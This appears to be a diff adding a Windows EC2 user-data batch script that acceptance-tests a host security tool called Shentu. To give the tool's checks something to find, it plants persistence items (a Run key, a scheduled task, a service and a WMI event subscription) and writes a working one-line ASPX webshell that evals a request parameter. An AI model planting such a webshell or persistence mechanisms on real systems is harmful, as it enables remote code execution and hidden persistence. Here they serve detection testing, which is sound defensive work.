@@ -1,0 +1,65 @@
+<script>
+@echo off
+rem Shentu acceptance on Windows Server 2019 (EC2 user-data, runs as SYSTEM).
+rem No PowerShell, no inbound access: everything runs here and the results
+rem go to a private S3 object through presigned URLs filled in by launch.sh.
+rem The instance shuts itself down (and so terminates) after 3 hours at most.
+shutdown /s /t 10800 /c "Shentu acceptance: 3-hour limit"
+
+set OUT=C:\shentu-accept
+set BIN=%ProgramFiles%\Shentu
+mkdir "%OUT%" "%BIN%" 2>nul
+curl.exe -fsS -o "%BIN%\shentu.exe" "{{SHENTU_URL}}" || goto :done
+curl.exe -fsS -o "%OUT%\hostfacts.exe" "{{HOSTFACTS_URL}}" || goto :done
+cd /d "%OUT%"
+
+rem 1. A clean host: facts, checks, a masked fixture.
+hostfacts.exe > facts-clean.json 2> facts-clean.err
+hostfacts.exe -checks > findings-clean.json 2>> facts-clean.err
+hostfacts.exe -record fixture-clean > nul 2>> facts-clean.err
+
+rem 2. IIS with an upload folder, so web roots and the ASP checks have a site.
+dism /online /enable-feature /featurename:IIS-WebServerRole /featurename:IIS-ASPNET45 /all /norestart /quiet > iis.log 2>&1
+mkdir C:\inetpub\wwwroot\uploads 2>nul
+
+rem 3. Plant what the checks must find (all named ShentuTest*, removed below).
+echo test> C:\Users\Public\shentutest.exe
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ShentuTest /d "C:\Users\Public\shentutest.exe" /f > plant.log 2>&1
+schtasks /create /tn ShentuTest /tr "C:\Users\Public\shentutest.exe" /sc onlogon /ru SYSTEM /f >> plant.log 2>&1
+sc create ShentuTestSvc binPath= "C:\Program Files\Shentu Test\svc.exe" start= demand >> plant.log 2>&1
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="ShentuTest", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" >> plant.log 2>&1
+wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="ShentuTest", CommandLineTemplate="C:\Users\Public\shentutest.exe" >> plant.log 2>&1
+wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"ShentuTest\"", Consumer="CommandLineEventConsumer.Name=\"ShentuTest\"" >> plant.log 2>&1
+rem A deliberate test webshell the ASP checks must flag. The instance has no
+rem inbound rule (launch.sh), so nothing can reach it, and it terminates.
+> C:\inetpub\wwwroot\uploads\shentutest.aspx echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^>
+
+rem 4. The planted host: the same, plus survey, patrol and the service.
+hostfacts.exe > facts-planted.json 2> facts-planted.err
+hostfacts.exe -checks > findings-planted.json 2>> facts-planted.err
+hostfacts.exe -record fixture-planted > nul 2>> facts-planted.err
+"%BIN%\shentu.exe" survey > survey.json 2> survey.err
+"%BIN%\shentu.exe" patrol --dry-run > patrol.txt 2>&1
+echo patrol exit %errorlevel% >> steps.log
+"%BIN%\shentu.exe" service install >> steps.log 2>&1
+"%BIN%\shentu.exe" service start >> steps.log 2>&1
+timeout /t 10 /nobreak > nul
+"%BIN%\shentu.exe" service status >> steps.log 2>&1
+"%BIN%\shentu.exe" service stop >> steps.log 2>&1
+"%BIN%\shentu.exe" service status >> steps.log 2>&1
+"%BIN%\shentu.exe" service uninstall >> steps.log 2>&1
+
+rem 5. Remove the planted items, then send everything back.
+reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ShentuTest /f > nul 2>&1
+schtasks /delete /tn ShentuTest /f > nul 2>&1
+sc delete ShentuTestSvc > nul 2>&1
+wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE "Filter='__EventFilter.Name=\"ShentuTest\"'" DELETE > nul 2>&1
+wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="ShentuTest" DELETE > nul 2>&1
+wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="ShentuTest" DELETE > nul 2>&1
+cd /d C:\
+tar -czf C:\shentu-accept.tgz shentu-accept
+curl.exe -fsS -X PUT -T C:\shentu-accept.tgz "{{RESULT_URL}}"
+
+:done
+shutdown /s /t 60 /c "Shentu acceptance finished"
+</script>
